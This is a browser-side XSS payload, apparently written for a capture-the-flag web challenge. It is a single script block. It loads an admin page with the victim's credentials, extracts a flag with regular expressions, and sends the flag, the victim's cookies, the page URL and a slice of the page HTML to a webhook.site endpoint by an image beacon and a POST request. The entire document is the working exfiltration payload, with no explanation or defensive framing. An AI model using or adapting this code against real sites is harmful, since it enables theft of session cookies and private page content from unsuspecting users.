<script>
  console.log('Starting exploit from:', window.location.origin);
  console.log('Cookies:', document.cookie);
  
  // Test which origin we're on
  fetch('http://94.237.61.52:42667/admin', { 
    credentials: 'include',
    mode: 'cors'
  })
    .then(r => {
      console.log('Response status:', r.status, r.statusText);
      return r.text();
    })
    .then(html => {
      console.log('Got HTML length:', html.length);
      
      // Multiple extraction methods
      let flag = 'NOT_FOUND';
      
      // 1. Look for h4 tag
      const h4Match = html.match(/<h4>([^<]+)<\/h4>/);
      if (h4Match) {
        flag = h4Match[1].trim();
        console.log('Found flag in h4:', flag);
      }
      
      // 2. Look for flag pattern
      if (flag === 'NOT_FOUND') {
        const flagPattern = html.match(/flag{.*?}/i);
        if (flagPattern) {
          flag = flagPattern[0];
          console.log('Found flag pattern:', flag);
        }
      }
      
      // 3. Send to webhook with metadata
      const payload = {
        flag: flag,
        cookies: document.cookie,
        origin: window.location.origin,
        url: window.location.href,
        htmlPreview: html.substring(0, 1000),
        timestamp: new Date().toISOString()
      };
      
      // Multiple delivery methods
      new Image().src = `https://webhook.site/5a0bcea6-6223-4e18-8e0d-7759204334ab?simple_flag=${encodeURIComponent(flag)}`;
      
      fetch('https://webhook.site/5a0bcea6-6223-4e18-8e0d-7759204334ab', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify(payload)
      });
      
    })
    .catch(err => {
      console.error('Fetch error:', err);
      new Image().src = `https://webhook.site/5a0bcea6-6223-4e18-8e0d-7759204334ab?fetch_error=${encodeURIComponent(err.message)}`;
    });
</script>
